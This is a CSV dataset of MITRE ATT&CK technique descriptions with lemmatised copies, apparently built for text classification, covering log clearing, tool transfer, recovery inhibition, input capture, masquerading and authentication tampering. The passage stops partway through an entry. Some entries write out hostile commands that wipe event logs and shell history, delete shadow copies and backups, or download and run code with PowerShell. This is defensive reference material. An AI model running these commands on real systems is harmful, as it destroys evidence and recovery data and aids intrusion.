T1070.001,Indicator Removal: Clear Windows Event Logs,"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.The event logs can be cleared with the following utility commands:wevtutil cl system wevtutil cl application wevtutil cl securityThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command Remove-EventLog -LogName Security to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.",adversary clear windows event logs hide activity intrusion windows event logs record computer alert notification system define source event system application security event type error warning information success audit failure audit event log clear following utility command wevtutil cl system wevtutil cl application wevtutil cl securitythese log clear mechanism event viewer gui powershell example adversary use powershell command remove eventlog security delete security eventlog reboot disable future logging note event generate log file time command run reboot
T1070.002,Indicator Removal: Clear Linux or Mac System Logs,"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the /var/log/ directory. Subfolders in this directory categorize logs by their related functions, such as:/var/log/messages:: General and system-related messages /var/log/secure or /var/log/auth.log: Authentication logs /var/log/utmp or /var/log/wtmp: Login records /var/log/kern.log: Kernel logs /var/log/cron.log: Crond logs /var/log/maillog: Mail server logs /var/log/httpd/: Web server access and error logs",adversary clear system log hide evidence intrusion macos linux track system user initiate action system log majority native system logging store directory subfolder directory categorize log related function log message general system relate message log secure log authentication log log utmp log wtmp login record log kernel log log crond log log maillog mail server log log web server access error log
T1070.003,Indicator Removal: Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions.Adversaries may delete their commands from these logs by manually clearing the history (history -c) or deleting the bash history file rm ~/.bash_history. Adversaries may also leverage a Network Device CLI on network devices to clear command history data (clear logging and/or clear history).On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the PSReadLine module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.The PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.Adversaries may run the PowerShell command Clear-History to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the ConsoleHost_history.txt file. Adversaries may also delete the ConsoleHost_history.txt file or edit its contents to hide PowerShell commands they have run.",addition clear system log adversary clear command history compromised account conceal action undertake intrusion command interpreter track command user type terminal user retrace linux macos command history access different way log command history track file point environment variable histfile user log system information flush file user home directory call benefit allow user command different session adversary delete command log manually clear history history delete bash history file rm adversary leverage network device cli network device clear command history datum clear logging clear windows host powershell different command history provider build history command history manage psreadline module build history track command current session command history available session delete session end psreadline command history track command powershell session write file env default history file available session contain past history file delete session end adversary run powershell command clear history flush entire command history current powershell session delete flush file adversary delete file edit content hide powershell command run
T1070.004,Indicator Removal: File Deletion,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",adversary delete file leave action intrusion activity malware tool non native file drop create system adversary ex ingress tool transfer leave trace indicate network removal file occur intrusion post intrusion process minimize adversary footprint tool available host operate system perform cleanup adversary use tool example build command scripting interpreter function include del windows rm unlink linux macos
T1070.005,Indicator Removal: Network Share Connection Removal,Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the net use \system\share /delete command.,adversary remove share connection long useful order clean trace operation windows shared drive smb windows admin shares connection remove long need net example utility remove network share connection net use command
T1070.006,Indicator Removal: Timestomp,"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.Timestomping may be used along with file name Masquerading to hide malware and tools.",adversary modify file time attribute hide new change exist file timestomping technique modify timestamp file modify access create change time mimic file folder example file modify create adversary appear conspicuous forensic investigator file analysis tool timestomping file masquerading hide malware tool
T1070.007,Indicator Removal: Clear Network Connection History and Configurations,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.Network connection history may be stored in various locations on a system. For example, RDP connection history may be stored in Windows Registry values under :HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\ServersWindows may also store information about recent RDP connections in files such as C:\Users\%username%\Documents\Default.rdp and C:\Users\%username%\AppData\Local\Microsoft\TerminalServer Client\Cache\.Malicious network connections may also require changes to network configuration settings, such as Disable or Modify System Firewall or tampering to enable Proxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",adversary clear remove evidence malicious network connection order clean trace operation configuration setting artifact highlight connection history create system behavior require network connection remote services external remote services defender use artifact monitor analyze network connection create adversary network connection history store location system example rdp connection history store windows registry value server server store information recent rdp connection file network connection require change network configuration setting disable modify system firewall tamper enable proxy adversary delete modify data conceal indicator impede defensive analysis
T1070.008,Indicator Removal: Clear Mailbox Data,"Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing/Internal Spearphishing, Email Collection, Mail Protocols for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used the ExchangePowerShell PowerShell module, including Remove-MailboxExportRequest to remove evidence of mailbox exports.Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.",adversary modify mail mail application datum remove evidence activity email application allow user program export delete mailbox datum command line tool use api mail application datum email email metadata log generate application operate system export request adversary manipulate email mailbox datum remove log artifact metadata evidence phishing internal spearphishing email collection mail protocols command control email base exfiltration exfiltration alternative protocol example remove evidence exchange server adversary exchangepowershell powershell module include remove mailboxexportrequest remove evidence mailbox export adversary remove email metadata header indicative spam suspicious activity example use organization wide transport rule reduce likelihood malicious email detect security product
T1070.009,Indicator Removal: Clear Persistence,"Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.",adversary clear artifact associate previously establish persistence host system remove evidence activity involve action remove service delete executable modify registry plist file modification method cleanup prevent defender collect evidence persistent presence instance artifact persistence remove adversary persistence execute order prevent error new instance malware
T1202,Indirect Command Execution,"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts. Adversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.",adversary abuse utility allow command execution bypass security restriction limit use command line interpreter windows utility execute command possibly invoke cmd example forfiles program compatibility assistant component windows subsystem linux wsl utility invoke execution program command command scripting interpreter run window script adversary abuse feature defense evasion specifically perform arbitrary execution subvert detection mitigation control group policy limit prevent usage cmd file extension commonly associate malicious payload
T1105,Ingress Tool Transfer,"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). Files can also be transferred using various Web Services as well as native or otherwise present tools on the victim system.On Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.",adversary transfer tool file external system compromised environment tool file copy external adversary control system victim network command control channel alternate protocol ftp present adversary transfer spread tool victim device compromised environment lateral tool transfer file transfer web service native present tool victim system windows adversary use utility download tool copy finger certutil powershell command object net invoke webrequest linux macos system variety utility exist curl scp sftp tftp rsync finger wget
T1490,Inhibit System Recovery,"Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:vssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet Windows Management Instrumentation can be used to delete volume shadow copies - wmic shadowcopy delete wbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no REAgentC.exe can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected systemOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.Adversaries may also delete ""online"" backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.",adversary delete remove build datum turn service design aid recovery corrupted system prevent recovery deny access available backup recovery option operate system contain feature help fix corrupted system backup catalog volume shadow copy automatic repair feature adversary disable delete system recovery feature augment effect data destruction data encrypt impact number native windows utility adversary disable delete system recovery feature delete volume shadow copy system delete shadow windows management instrumentation delete volume shadow copy wmic shadowcopy delete delete windows backup catalog delete catalog disable automatic windows recovery feature modify boot configuration datum default bootstatuspolicy ignoreallfailure bcdedit default recoveryenabled disable windows recovery environment winre repair recovery option infected systemon network device adversary leverage disk wipe delete backup firmware image reformat file system system shutdown reboot reload device activity leave network device completely inoperable inhibit recovery operation adversary delete online backup connect network network storage medium folder sync cloud service
T1056,Input Capture,"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",adversary use method capture user input obtain credential collect information normal system usage user provide credential different location login page portal system dialog box input capture mechanism transparent user credential api hooking rely deceive user provide input believe genuine service web portal capture
T1056.001,Input Capture: Keylogging,"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data. Reading raw keystroke data from the hardware buffer. Windows Registry modifications. Custom drivers. Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",adversary log user keystroke intercept credential user type keylogging likely acquire credential new access opportunity os credential dumping effort effective require adversary intercept keystroke system substantial period time credential successfully capture keylogging prevalent type input capture different way intercept keystroke method include hook api callback process keystroke unlike credential api hooking focus solely api function intend process keystroke datum read raw keystroke datum hardware buffer windows registry modification custom driver modify system image provide adversary hook operate system network device read raw keystroke login session
T1056.002,Input Capture: GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.",adversary mimic common operating system gui component prompt user credential seemingly legitimate prompt program execute need additional privilege present current user context common operate system prompt user proper credential authorize elevated privilege task ex bypass user account mimic functionality prompt user credential seemingly legitimate prompt number reason mimic normal usage fake installer require additional access fake malware removal suite
T1056.003,Input Capture: Web Portal Capture,"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service.",adversary install code externally face portal vpn login page capture transmit credential user attempt log service example compromise login page log provide user credential log user service variation input capture conduct post compromise legitimate administrative access backup measure maintain network access external remote services valid accounts initial compromise exploitation externally face web service
T1056.004,Input Capture: Credential API Hooking,"Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging, this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:Hooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. Import address table (IAT) hooking, which use modifications to a process’s IAT, where pointers to imported API functions are stored. Inline hooking, which overwrites the first bytes in an API function to redirect code flow.",adversary hook windows application programming interface api function collect user credential malicious hooking mechanism capture api call include parameter reveal user authentication credential unlike keylogging technique focus specifically api function include parameter reveal user credential hooking involve redirect call function implement hooks procedure intercept execute designate code response event message keystroke mouse input import address table iat hooking use modification process iat pointer import api function store inline hooking overwrite byte api function redirect code flow
T1559,Inter-Process Communication,"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes.",adversary abuse inter process communication ipc mechanism local code command execution ipc typically process share datum communicate synchronize execution ipc commonly avoid situation deadlock occur process stick cyclic waiting pattern adversary abuse ipc execute arbitrary code command ipc mechanism differ depend os typically exist form accessible programming language library native interface windows dynamic data exchange component object model linux environment support different ipc mechanism socket pipe
T1559.001,Inter-Process Communication: Component Object Model,"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic.",adversary use windows component object model com local code execution com inter process communication ipc component native windows application programming interface api enable interaction software object executable code implement interface com interface expose abuse invoke arbitrary execution variety programming language c java visual basic
T1559.002,Inter-Process Communication: Dynamic Data Exchange,"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).",adversary use windows dynamic data exchange dde execute arbitrary command dde client server protocol time continuous inter process communication ipc application link establish application autonomously exchange transaction consist string warm datum link notification data item change hot datum link duplication change data item request command execution object linking embedding ole ability link datum document originally implement dde despite supersede component object model dde enable windows microsoft office registry key microsoft office document poison dde command directly embed file deliver execution phishing campaign host web content avoid use visual basic applications vba macro dde leverage adversary operate compromised machine direct access command scripting interpreter dde execution invoke remotely remote service distributed component object model dcom
T1559.003,Inter-Process Communication: XPC Services,"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service C API or the high level NSXPCConnection API in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler. This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct Exploitation for Privilege Escalation.",adversary provide malicious content xpc service daemon local code execution macos use xpc service basic inter process communication process xpc service daemon party application privileged helper tool application send message xpc service daemon run root low level xpc service c api high level nsxpcconnection api order handle task require elevated privilege network connection application responsible provide protocol definition serve blueprint xpc service developer typically use xpc services provide application stability privilege separation application client daemon adversary abuse xpc service execute malicious content request malicious execution pass application xpc services handler include identify abuse improper xpc client validation poor sanitization input parameter conduct exploitation privilege escalation
T1534,Internal Spearphishing,"Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.Adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic email login interfaces.There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.",adversary use internal spearphishing gain access additional information exploit user organization access account system environment internal spearphishing multi staged campaign email account own control user device previously instal malware compromise account credential user adversary attempt advantage trust internal account increase likelihood trick target fall phish attempt adversary leverage spearphishing attachment spearphishing link internal spearphishing deliver payload redirect external site capture credential input capture site mimic email login interface notable incident internal spearphishing eye pyramid campaign phishing email malicious attachment lateral movement victim compromise nearly email account process
T1570,Lateral Tool Transfer,"Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e. Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp.",adversary transfer tool file system compromised environment bring victim environment ingress tool transfer file copy system stage adversary tool file course operation adversary copy file internal victim system support lateral movement inherent file sharing protocol file sharing smb windows admin shares connect network share authenticate connection remote desktop protocol file transfer native present tool victim system scp rsync curl sftp ftp
T1036,Masquerading,"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.Renaming abusable system utilities to evade security monitoring is also a form of Masquerading.",adversary attempt manipulate feature artifact appear legitimate benign user security tool masquerading occur location object legitimate malicious manipulate abuse sake evade defense observation include manipulate file metadata trick user misidentify file type give legitimate task service name rename abusable system utility evade security monitoring form masquerading
T1036.001,Masquerading: Invalid Code Signature,"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.Unlike Code Signing, this activity will not result in a valid signature.",adversary attempt mimic feature valid code signature increase chance deceive user analyst tool code signing provide level authenticity binary developer guarantee binary tamper adversary copy metadata signature information sign program use template unsigned program file invalid code signature fail digital signature validation check appear legitimate user security tool improperly handle file unlike code signing activity result valid signature
T1036.002,Masquerading: Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png.Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",adversary abuse right left override rtlo rlo character disguise string file appear benign rtlo non printing unicode character cause text follow display reverse example windows screensaver executable name march display march javascript file name display adversary abuse rtlo character means trick user execute think benign file type common use technique spearphishing attachment malicious file trick end user defender aware tool display render rtlo character use rtlo character see target intrusion attempt criminal activity rtlo windows registry display reverse character command line tool default
T1036.003,Masquerading: Rename System Utilities,Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.,adversary rename legitimate system utility try evade security mechanism concern usage utility security monitoring control mechanism place system utility adversary capable abuse
T1036.004,Masquerading: Masquerade Task or Service,"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",adversary attempt manipulate task service appear legitimate benign task service execute task scheduler systemd typically give description windows service service display benign task service exist commonly associate name adversary task service name similar identical legitimate one task service contain field description adversary attempt appear legitimate
T1036.005,Masquerading: Match Legitimate Name or Location,"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.Adversaries may also use the same icon of the file they are trying to mimic.",adversary match approximate location legitimate file resource name place sake evade defense observation place executable commonly trust directory ex give legitimate trusted program ex containerized environment create resource namespace match naming convention container pod cluster alternatively file container image give close approximation legitimate program image innocuous adversary use icon file try mimic
T1036.006,Masquerading: Space after Filename,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to evil.txt (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed .Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",adversary hide program true filetype change extension file certain file type specifically work extension append space end filename change file process operate system example mach o executable file call double click user launch execute file rename double click user launch default text editing application execute binary file rename note space end double click user true file type determine os handle appropriately binary execute use feature trick user double click benign look file format ultimately execute malicious
T1036.007,Masquerading: Double File Extension,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: File.txt.exe may render in some views as just File.txt). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies. Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain Initial Access into a user’s system via Spearphishing Attachment then User Execution. For example, an executable file attachment named Evil.txt.exe may display as Evil.txt to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",adversary abuse double extension filename means masquerade true file type file include secondary file type extension cause extension display ex render view second extension true file type determine file open execute real file extension hide operate system file browser ex software configure similar system policy adversary abuse double extension attempt conceal dangerous file type payload common usage involve trick user open think benign file type actually executable code file pose email attachment allow adversary gain initial access user system spearphishing attachment user execution example executable file attachment name display user user view benign text file open inadvertently execute hide malware common file type text file etc image file etc typically extension appear benign executable extension commonly regard dangerous appear second extension true file type
T1036.008,Masquerading: Masquerade File Type,"Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file, is 0xFF 0xD8 and the file extension is either .JPE, .JPEG or .JPG. Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., Ingress Tool Transfer) and stored (e.g., Upload Malware) so that adversaries may move their malware without triggering detections. Common non-executable file types and extensions, such as text files (.txt) and image files (.jpg, .gif, etc.) may be typically treated as benign. Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of test.gif. A user may not know that a file is malicious due to the benign appearance and file extension.Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.",adversary masquerade malicious payload legitimate file change payload formatting include file signature extension content file type typical standard format include encode organize example file signature know header magic byte begin byte file identify file type example header jpeg file file extension adversary edit header hex code file extension malicious payload order bypass file validation check input sanitization behavior commonly payload file transfer ingress tool transfer store upload malware adversary malware trigger detection common non executable file type extension text file image file etc typically treat benign base adversary use file extension disguise malware name php backdoor code file user know file malicious benign appearance file extension polygot file file multiple different file type function differently base application execute disguise malicious malware capability
T1556,Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",adversary modify authentication mechanism process access user credential enable unwarranted access account authentication process handle mechanism local security authentication server lsass process security accounts manager sam windows pluggable authentication module pam unix base system authorization plugin macos system responsible gather store validate credential modify authentication process adversary able authenticate service system valid accounts adversary maliciously modify process reveal credential bypass authentication mechanism compromised credential access bypass access control place resource system network persistent access remote system externally available service vpn outlook web access remote desktop
T1556.001,Modify Authentication Process: Domain Controller Authentication,"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.",adversary patch authentication process domain controller bypass typical authentication mechanism enable access account malware inject false credential authentication process domain controller intent create backdoor access user account credential ex skeleton key skeleton key work patch enterprise domain controller authentication process lsass credential adversary use bypass standard authentication system patch adversary use inject password successfully authenticate domain user account skeleton key erase memory reboot domain controller authenticated access enable unfettered access host resource single factor authentication environment
T1556.002,Modify Authentication Process: Password Filter DLL,"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.",adversary register malicious password filter dynamic link library dlls authentication process acquire user credential validate windows password filter password policy enforcement mechanism domain local account filter implement dll contain method validate potential password password policy filter dlls position local computer local account domain controller domain account register new password security accounts manager sam local security authority lsa request validation register filter potential 